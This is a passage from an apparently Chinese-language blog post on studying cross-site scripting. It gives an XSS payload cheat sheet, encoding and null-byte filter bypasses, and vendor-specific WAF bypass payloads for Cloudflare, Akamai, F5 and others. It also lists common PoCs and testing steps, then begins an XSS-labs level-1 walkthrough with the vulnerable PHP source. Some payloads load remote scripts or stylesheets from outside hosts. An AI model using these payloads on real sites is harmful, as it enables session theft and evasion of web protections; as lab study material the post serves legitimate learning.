&lt;svg&gt;&lt;script&gt;alert&amp;#40;1&amp;#41&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>8、存在注释符的话，可用或<code>&lt;!-- --!&gt;</code>绕过</p><p>9、<code>str_replace()</code>函数是区分大小写的</p><p>10、黑名单的时候可以使用URL编码等进行编码的方式：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascrip<span class="symbol">&amp;#x74;</span>:alert(1)、javasc<span class="symbol">&amp;#x72;</span>ipt:alert&#x27;1&#x27;</span><br></pre></td></tr></table></figure><p>11、可利用<code>注释符（//）</code>与<code>换行/回车（%0a/%0d）</code>绕过各种规定方式（比如必须添加某些参数或者无法输入空格等）</p><p>12、<strong>外链xss脚本</strong>：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">SCRIPT</span> <span class="attr">SRC</span>=<span class="string">http://3w.org/XSS/xss.js</span>&gt;</span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span><br></pre></td></tr></table></figure><p>13、<code>IMG</code>标签型：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">SRC</span>=<span class="string">javascript:alert(</span>&#x27;<span class="attr">XSS</span>&#x27;)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">SRC</span>=<span class="string">javascript:alert(String.fromCharCode(88,83,83))</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">SRC</span>=<span class="string">&amp;#x6A&amp;#x61&amp;#x76&amp;#x61（16进制编码）&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29</span>&gt;</span></span><br></pre></td></tr></table></figure><p>14、<code>嵌入式</code>标签：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">SRC</span>=<span class="string">&quot;javascript:alert(&#x27;XSS&#x27;);&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">SRC</span>=<span class="string">&quot;javascript:alert(&#x27;XSS&#x27;);&quot;</span>&gt;</span>（嵌入式编码标签）</span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">SRC</span>=<span class="string">&quot;javascript:alert(&#x27;XSS&#x27;);&quot;</span>&gt;</span>（嵌入式换行符）（嵌入式回车）</span><br></pre></td></tr></table></figure><p>15、双开括号：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;&lt;SCRIPT&gt;alert(“XSS”);//&lt;&lt;/SCRIPT&gt;</span><br></pre></td></tr></table></figure><p>16、<code>BODY</code>图片：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">BODY</span> <span class="attr">BACKGROUND</span>=<span class="string">&quot;javascript:alert(&#x27;XSS&#x27;)&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>17、IMG <strong>Dynsrc</strong>：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">DYNSRC</span>=<span class="string">&quot;javascript:alert(&#x27;XSS&#x27;)&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>IMG <strong>Lowsrc</strong>：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">LOWSRC</span>=<span class="string">&quot;javascript:alert(&#x27;XSS&#x27;)&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>18、DIV background-image：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">DIV</span> <span class="attr">STYLE</span>=<span class="string">&quot;background-image:url(javascript:alert(&#x27;XSS&#x27;))&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>19、javascript链接：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">A</span> <span class="attr">HREF</span>=<span class="string">&quot;javascript:document.location=&#x27;http://www.google.com/&#x27;&quot;</span>&gt;</span>XSS<span class="tag">&lt;/<span class="name">A</span>&gt;</span></span><br></pre></td></tr></table></figure><p>20、embed：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">embed</span> <span class="attr">src</span>=<span class="string">&quot;javascript:alert(1)&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>21、video：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">onerror</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>22、在JavaScript中可以进行<code>Unicode转义、十六进制和八进制转义</code>。此外，字符串中的<code>多余转义字符串将被忽略</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Copy&lt;script&gt;a \u006cert(1) ;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script&gt;eval(‘ a\u006cert(1) ’);&lt;&#x2F;script&gt; </span><br><span class="line">&lt;script&gt;eval(‘ a\x6cert(1) ’);&lt;&#x2F;script&gt; </span><br><span class="line">&lt;script&gt;eval(‘ a\154ert(1) ’);&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script&gt;eval(‘ a\1\ert\(1\) ’);&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><h2 id="二：绕过方式"><a href="#二：绕过方式" class="headerlink" title="二：绕过方式"></a>二：绕过方式</h2><p>1、<strong>双url</strong>编码<br>把<code>% url</code>编码成<code> %25</code> ，如果后台对参数有再次进行url decode 或者输出的时候有 url decode 就可以绕过WAF。</p><p>2、<code>base64</code>编码<br>WAF不拦截<code>&lt;&gt;</code>，但拦截<code> script onXXXX</code> , 用base64 绕过。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Copy<span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgnYmFzZTY0X2lmcmFtZScpPC9zY3JpcHQ+&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>3、HTML<code>实体编码</code>绕过<br>（1）<strong>解释：</strong>实体编码一开始是为了避免譬如在你的双引号中要输入数据中包括双引号导致浏览器把你输入的引号当作上一个引号的姐妹标签而异常闭合而提出的。</p><p>payload:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Copy<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&#x27;javascript:alert<span class="symbol">&amp;#40;</span><span class="symbol">&amp;#39;</span>123<span class="symbol">&amp;#39;</span><span class="symbol">&amp;#41;</span>&#x27;</span>&gt;</span>hello<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;j<span class="symbol">&amp;#97;</span>vascript:alert<span class="symbol">&amp;#0000040;</span>&#x27;123&#x27;<span class="symbol">&amp;#41;</span>&quot;</span>&gt;</span>hello<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>tip:</strong><br>（2）其实在标签里的<code>伪协议js</code>代码，是可以<code>不用用双引号引起来</code>的。<br>加上<code>eval</code>函数后（eval认识 <code>\x</code>十六进制 八进制 <code>\u </code>unicode编码)</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Copy<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;j<span class="symbol">&amp;#97;</span>vascript:eval(&#x27;&amp;#;\u0091\x65\x72\x74\x28\x22\x31\x22\x29&#x27;)&quot;</span>&gt;</span>hello<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>（3）如果页面直接显示输入内容，可以<strong>先html 编码，再url 编码</strong>。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">%26%2397%3B%26%23108%3B%26%23101%3B%26%23114%3B%26%23116%3B(document.domain)</span>&gt;</span></span><br></pre></td></tr></table></figure><p>4、过滤<code> /script</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Copy<span class="tag">&lt;<span class="name">%2fscript</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">%252fscript</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">%252fScRipt</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">%252fScrIPt%20</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">%252fsCrIpt+ipT%20</span>&gt;</span></span><br></pre></td></tr></table></figure><p>5、过滤<code>括号</code><br>当括号被过滤的时候可以使用<code>throw</code>来绕过：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">onmouseover</span>=<span class="string">&quot;javascript:window.onerror=alert;throw 1&gt;</span></span></span><br><span class="line"><span class="tag"><span class="string">&lt;img src=x onerror=&quot;</span><span class="attr">javascript:window.onerror</span>=<span class="string">alert;throw</span> <span class="attr">1</span>&quot;&gt;</span></span><br></pre></td></tr></table></figure><p>6、利用<strong>0字节</strong>绕过</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">scri%00pt</span>&gt;</span>alert(1);<span class="tag">&lt;/<span class="name">scri%00pt</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">scri\x00pt</span>&gt;</span>alert(1);<span class="tag">&lt;/<span class="name">scri%00pt</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">s%00c%00r%00%00ip%00t</span>&gt;</span>confirm(0);<span class="tag">&lt;/<span class="name">s%00c%00r%00%00ip%00t</span>&gt;</span></span><br></pre></td></tr></table></figure><p>7、<strong>先拆分再组合</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="keyword">var</span> a=<span class="string">&#x27;h&#x27;</span>;<span class="keyword">var</span> b=<span class="string">&#x27;:\/\/&#x27;</span>;<span class="built_in">document</span>.write(<span class="string">&#x27;&lt;script src=&quot;&#x27;</span>+a+<span class="string">&#x27;ttp&#x27;</span>+b+<span class="string">&#x27;xss.tw/xxx&quot;&gt;&lt;\/script&gt;&#x27;</span>);</span></span><br></pre></td></tr></table></figure><p>8、利用<code>ascii</code>编码绕过</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span>/ \/\μ <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(1)//</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">\x17\x17</span> <span class="attr">onerror</span>=<span class="string">alert(1)//</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span>/\%<span class="attr">20src</span>=<span class="string">%17y%17</span> <span class="attr">onerror</span>=<span class="string">%C2%A0alert(1)//</span>&gt;</span></span><br></pre></td></tr></table></figure><p>9、过滤<code>括号</code>和<code>分</code>号<br>你可以使用<code>花</code>括号来进行语句隔离，将<code>onerror</code>整体放入花括号中。这样就避免了使用分号：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">&#123;onerror=alert&#125;<span class="keyword">throw</span> <span class="number">1337</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="三：常见的waf-bypass"><a href="#三：常见的waf-bypass" class="headerlink" title="三：常见的waf bypass"></a>三：常见的<code>waf bypass</code></h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">WAF名称：Cloudflare</span><br><span class="line">Payload：<span class="tag">&lt;<span class="name">a”</span>/<span class="attr">onclick</span>=<span class="string">(confirm)()</span>&gt;</span>click</span><br><span class="line">绕过技术：非空格填充</span><br><span class="line"></span><br><span class="line">WAF名称：Wordfence</span><br><span class="line">Payload：<span class="tag">&lt;<span class="name">a</span>/<span class="attr">href</span>=<span class="string">javascript&amp;colon;alert()</span>&gt;</span>click</span><br><span class="line">绕过技术：数字字符编码</span><br><span class="line"></span><br><span class="line">WAF名称：Barracuda</span><br><span class="line">Payload：<span class="tag">&lt;<span class="name">a</span>/<span class="attr">href</span>=<span class="string">&amp;#74;ava%0a%0d%09script&amp;colon;alert()</span>&gt;</span>click</span><br><span class="line">绕过技术：数字字符编码</span><br><span class="line"></span><br><span class="line">WAF名称：Akamai</span><br><span class="line">Payload：<span class="tag">&lt;<span class="name">d3v</span>/<span class="attr">onauxclick</span>=<span class="string">[2].some(confirm)</span>&gt;</span>click</span><br><span class="line">绕过技术：黑名单中缺少事件处理器以及函数调用混淆</span><br><span class="line"></span><br><span class="line">WAF名称：Comodo</span><br><span class="line">Payload：<span class="tag">&lt;<span class="name">d3v</span>/<span class="attr">onauxclick</span>=<span class="string">(((confirm)))“</span>&gt;</span>click</span><br><span class="line">绕过技术：黑名单中缺少事件处理器以及函数调用混淆</span><br><span class="line"></span><br><span class="line">WAF名称：F5</span><br><span class="line">Payload：<span class="tag">&lt;<span class="name">d3v</span>/<span class="attr">onmouseleave</span>=<span class="string">[2].some(confirm)</span>&gt;</span>click</span><br><span class="line">绕过技术：黑名单中缺少事件处理器以及函数调用混淆</span><br><span class="line"></span><br><span class="line">WAF名称：ModSecurity</span><br><span class="line">Payload：<span class="tag">&lt;<span class="name">details</span>/<span class="attr">open</span>/<span class="attr">ontoggle</span>=<span class="string">alert()</span>&gt;</span></span><br><span class="line">绕过技术：黑名单中缺少标签或事件处理器</span><br><span class="line"></span><br><span class="line">WAF名称：dotdefender</span><br><span class="line">Payload：<span class="tag">&lt;<span class="name">details</span>/<span class="attr">open</span>/<span class="attr">ontoggle</span>=<span class="string">(confirm)()//</span></span></span><br></pre></td></tr></table></figure><h1 id="XSS-labs学习"><a href="#XSS-labs学习" class="headerlink" title="XSS-labs学习"></a>XSS-labs学习</h1><p>参考文章：<code>http://0verflow.cn/?p=1590</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="string">&#x27;XSS&#x27;</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure><h2 id="常见的POC"><a href="#常见的POC" class="headerlink" title="常见的POC"></a>常见的POC</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="string">&#x27;XSS&#x27;</span>)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;alert(<span class="number">1</span>)&lt;/script&gt;</span><br><span class="line"><span class="string">&quot;&gt;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;</span></span><br><span class="line"><span class="string">&quot;</span>&gt;<span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="string">&#x27;xss&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><span class="comment">//</span></span><br><span class="line">javaSCript:alert(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">事件触发</span><br><span class="line"><span class="string">&#x27;onfocus=javascript:alert(&#x27;</span>xss<span class="string">&#x27;) &gt; //</span></span><br><span class="line"><span class="string">&quot; onfocus=javascript:alert(‘xss’)&gt;</span></span><br><span class="line"><span class="string">&#x27;</span> onmouseover=<span class="string">&#x27;javascript:alert(1)</span></span><br><span class="line"><span class="string">&#x27;</span>onclick=<span class="string">&#x27;alert(1)</span></span><br><span class="line"><span class="string">&quot; onfocus=javascript:alert(1) &quot;</span></span><br><span class="line"><span class="string">&quot; onclick=javascript:alert(1) &quot;</span></span><br><span class="line"><span class="string">&quot; type=&quot;button&quot; onclick=javascript:alert(1) &quot;</span></span><br><span class="line"><span class="string">click here &quot; type=&quot;button&quot; onclick=javascript:alert(1)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&gt; &lt;a href=javascript:alert(1) &gt; xss&lt;/a&gt; //</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">大小写混写</span></span><br><span class="line"><span class="string">&quot;&gt; &lt;a hREF=javascript:alert(1) &gt; xss&lt;/a&gt; //</span></span><br><span class="line"><span class="string">&quot; &gt;&lt;sCRipt&gt;alert(&#x27;</span>XSS<span class="string">&#x27;)&lt;/sCript&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">双写</span></span><br><span class="line"><span class="string">&quot; oonnclick=javaSscriptCRIPt:alert(1) &quot; </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">将提交的js代码进行编码</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">利用a标签中的 href属性来执行javascript代码(即href属性可能是url地址或者是JavaScript伪协议)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">应对过滤,以下方法</span></span><br><span class="line"><span class="string">（1）href属性引号中的内容可以使用空字符、空格、TAB换行、回车、注释、特殊的函数，将代码隔开。 如：javas%09cript:alert()、javas%0acript:alert()、javas%0dcript:alert()</span></span><br><span class="line"><span class="string">（2）使用html实体编码绕过替换（16进制、unicode 等等）</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">有时候标签时隐藏的，可以使用如下进行标签突破</span></span><br><span class="line"><span class="string">&lt;script&gt;alert(1)&lt;/script&gt;&amp;t_link=&quot; type=&quot;text&quot;&amp;t_history=&quot; type=&quot;text&quot;&amp;t_sort=&quot; type=&quot;text&quot; //t_xxx都是标签名</span></span><br><span class="line"><span class="string">&lt;script&gt;alert(1)&lt;/script&gt;&amp;t_sort=&quot; type=&quot;text&quot; onclick=&quot;alert(1)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">闭合标签 + 标签属性值 + 尖括号 + 编码 + 构造事件触发xss +  属性的javascript协议 + css注入  都可以作为突破口</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">标签内添加属性</span></span><br><span class="line"><span class="string">&amp;t_sort=click here&quot; type=&quot;button&quot; onclick=&quot;javascript:alert(1)  //t_sort是keyword</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">通过referer头来提交恶意代码触发了XSS   // level11</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">exif xss   //level 14</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">无需闭合的标签</span></span><br><span class="line"><span class="string">&lt;img&gt;</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">以上的所有要学会举一反三</span></span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><h3 id="反射型XSS测试步骤总结："><a href="#反射型XSS测试步骤总结：" class="headerlink" title="反射型XSS测试步骤总结："></a>反射型XSS测试步骤总结：</h3><ul><li>1.检测<code>输入变量</code>，确认每个web页面中<code>用户可自定义的变量</code>，如HTTP参数、POST数据、隐藏表单字段值、预定义的radio值或选择值</li><li>2.分别确认每个输入变量是否存在xss漏洞。变量输入处输入poc，查看返回的web页面的html中poc代码是否被<code>过滤</code>，浏览器是否<code>响应</code>poc，若存在过滤，进行测试查看能否进行<code>绕过</code>。</li></ul><h3 id="xss的攻防："><a href="#xss的攻防：" class="headerlink" title="xss的攻防："></a>xss的攻防：</h3><ul><li><p>1.利用<code>&lt;&gt;</code>标记，构造<code>&lt;script&gt;</code>标签可执行<code>javascript</code>的<code>xss</code>代码。</p><ul><li>xss过滤函数：需过滤<code>&lt;&gt;&lt;script&gt;&lt;/script&gt;</code>等字符。</li></ul></li><li><p>2.利用<code>html标签属性</code>支持<code>javascript:伪协议</code>（支持标签属性的有<code>href、lowsrc、bgsound、background、value、action、dynsrc</code>等），执行xss代码。</p><ul><li>xss 过滤函数：需过滤<code>JavaScript</code>等关键字。</li></ul></li><li><p>3.利用<code>javascript</code>在**<code>引号</code>中只用<code>分号</code>分隔单词或强制语句结束，用<code>换行符</code>忽略分号强制结束一个完整语句，而忽略回车、空格、tab等键，绕过对<code>javascript</code>的关键字的过滤**。</p></li><li><p>4.利用**<code>html</code>标签属性值支持<code>ascii</code>码<strong>，对标签属性值进行</strong>转码**进行规则库的绕过。</p><ul><li>xss 过滤函数：需过滤<code>&amp;#\</code>等字符。</li></ul></li><li><p>5.利用<strong>事件处理函数</strong>，触发事件，执行xss代码。例如<code>&lt;img src=&#39;#&#39; onerror=alert(/xss/)&gt;</code>,当浏览器响应页面时，找不到图片的地址，触发<code>onerror</code>事件。</p></li><li><p>6.利用<code>css</code>执行<code>javascript</code>代码</p><ul><li>css代码中利用<strong>expression</strong>触发xss漏洞。如下所示：</li></ul></li></ul><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;div style=&quot;width: expression(alert(&#x27;xss&#x27;));&gt;</span><br><span class="line"></span><br><span class="line">&lt;img src=&quot;#&quot; style=&quot;xss:expression(alert(/xss/));&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;style&gt;body &#123;background-image:expression(alert(&quot;xss&quot;));&#125;&lt;/style&gt;</span><br><span class="line"></span><br><span class="line">&lt;div style=&quot;list-style-image:url(javascript:alert(&#x27;xss&#x27;))&quot;&gt;</span><br></pre></td></tr></table></figure><ul><li><p>css代码中利用**@import**触发xss    </p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="selector-tag">stytle</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="keyword">@import</span> <span class="string">&#x27;javascript:alert(&quot;XSS&quot;)&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&lt;/stytle&gt;</span><br></pre></td></tr></table></figure></li><li><p>css代码中使用**@import<strong>和</strong>link**方式<code>导入外部含有xss代码的样式表文件</code></p></li></ul><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;link rel=&quot;stytlesheet&quot; href=&quot;h</span><br><span class="line">ttp://www.***.com/a.css&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;stytle type=&#x27;text/css&#x27;&gt;@import url(http://www.*.com/a.css);&lt;/style&gt;</span><br></pre></td></tr></table></figure><ul><li>xss过滤函数需过滤<code>style标签、style属性、expression、javascript、import</code>等关键字。</li><li>7.利用<code>大小写混淆</code>、使用<code>单引号</code>、<code>不</code>使用<code>引号</code>、使用<code>/</code>插入在<code>img src中间</code>、构造<code>不同的全角字符</code>、运用<code>/**/</code>混淆过滤规则来绕过过滤函数</li><li>8.利用<strong>字符编码</strong>。javascript支持<code>unicode</code>、<code>escapes</code>、<code>十六进制</code>、<code>八进制</code>等编码形式。</li></ul><h2 id="XSS-labs-level1（without-filter）"><a href="#XSS-labs-level1（without-filter）" class="headerlink" title="XSS-labs level1（without filter）"></a>XSS-labs level1（without filter）</h2><p>1.先看下主界面</p><p>很明显就是get一个name,然后echo出来</p><p>2.查看源码可以看到没有进行任何的过滤</p><p><img src="/2020/07/14/XSS%E7%BB%BC%E5%90%88%E5%AD%A6%E4%B9%A0/image-20200528161344710.png" alt="image-20200528161344710"></p><p>3.<strong>name参数的值直接插入到了标签之中。那么这样看来这一关主要就是考察反射型XSS</strong>,显然存在反射型的XSS漏洞，那么我们直接构造一个javascript弹窗</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="string">&#x27;XSS&#x27;</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>Note:<strong>由于不知道服务器端对于提交的敏感字符有没有过滤，所以这里直接在name参数中赋值一个简单的弹窗来进行测试</strong>,上面是由于我们看了源码的缘故</p><p>由于后端的限制没有直接弹出 XSS 这个我们设置的窗，但提示过关证明我们插入的XSS恶意代码已经执行</p><p><img src="/2020/07/14/XSS%E7%BB%BC%E5%90%88%E5%AD%A6%E4%B9%A0/image-20200528162452260.png" alt="image-20200528162452260"></p><p><strong>注意：</strong>我在chrome输入上述的代码后，并未弹窗，查看源码，发现alert（）中的<code>&#39;</code>单引号被转义 了，变成了<code>\&#39;</code>了，所以我用的 是alert（1）进行弹窗的</p><p><strong>可以看到服务器是将我们提交的恶意代码原封不动的返回</strong></p><h3 id="好奇心"><a href="#好奇心" class="headerlink" title="好奇心"></a>好奇心</h3><p>这里很好奇为什么可以自动到第二关，所以就去查了下php源码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">&quot;name&quot;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;欢迎用户&quot;</span>.$str.<span class="string">&quot;&lt;/h2&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里有个ini_set(“display_errors”, 0)，结果是用来看控制php错误报告的，看来原因就是在前端刚刚的那个脚本上了，其实就是当弹框的时候就会自动重定向到下一跳，感觉是把windows.alert函数进行重写了，同时查了下几个弹窗函数的区别，参考<code>https://baynk.blog.csdn.net/article/details/103180215</code>文章</p><h2 id="xss-labs-level-2（close-labe-构弹l）"><a href="#xss-labs-level-2（close-labe-构弹l）" class="headerlink" title="xss-labs level 2（close labe/构弹l）"></a>xss-labs level 2（close 